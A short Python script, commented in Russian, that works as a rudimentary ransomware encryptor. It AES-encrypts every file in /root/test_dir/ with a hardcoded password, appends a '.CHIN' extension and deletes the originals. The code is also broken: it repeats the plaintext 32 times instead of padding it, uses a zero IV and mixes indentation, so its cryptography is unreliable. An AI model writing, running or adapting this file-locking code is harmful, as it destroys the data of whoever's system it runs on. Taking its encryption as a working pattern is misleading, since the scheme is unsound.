#!/usr/bin/python
#Шифрование файла алгоритмом AES-256

import os, hashlib
from Crypto.Cipher import AES                                           # PyCrypto


def AES256_Cryptor(PASSWORD, TEXT):
        KEY = hashlib.sha256(PASSWORD).digest()
        IV = 16 * "\x00"
        mode = AES.MODE_CBC
        encrypt_funct = AES.new(KEY, mode, IV = IV)
        text_for_coding = TEXT * 32

        ciphertext = encrypt_funct.encrypt(text_for_coding)
	return ciphertext


def encrypt_files():
	path = "/root/test_dir/"
	os.chdir(path)
	files = os.listdir("/root/test_dir/")
	for file in files:
		try:
			with open(file, "r") as f:
				data = f.read()
				f.close()
			with open(file + ".CHIN", "w") as encrypt_file:
				encrypt_file.write(AES256_Cryptor("China2019", data))
				encrypt_file.close()
			os.remove(file)
		except:
			os.rename(file, file + ".CHIN")


if __name__ == "__main__":
        encrypt_files()
